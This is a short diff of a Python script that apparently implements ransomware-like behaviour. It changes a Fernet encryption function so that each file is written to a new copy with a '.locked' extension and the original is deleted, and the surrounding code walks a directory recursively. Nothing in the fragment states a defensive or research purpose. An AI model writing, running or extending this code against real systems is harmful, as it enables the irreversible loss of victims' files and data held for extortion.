@@ -16,8 +16,12 @@ def encrypt_file(file_path, key):
         data = file.read()
     fernet = Fernet(key)
     encrypted_data = fernet.encrypt(data)
-    with open(file_path, 'wb') as file:
+    
+    encryptedFile = file_path.with_suffix(file_path.suffix + ".locked")
+    with open(encryptedFile, 'wb') as file:
         file.write(encrypted_data)
+        
+    file_path.unlink()
 
 def encrypt_directory(directory_path, key):
     for item in Path(directory_path).rglob('*'):
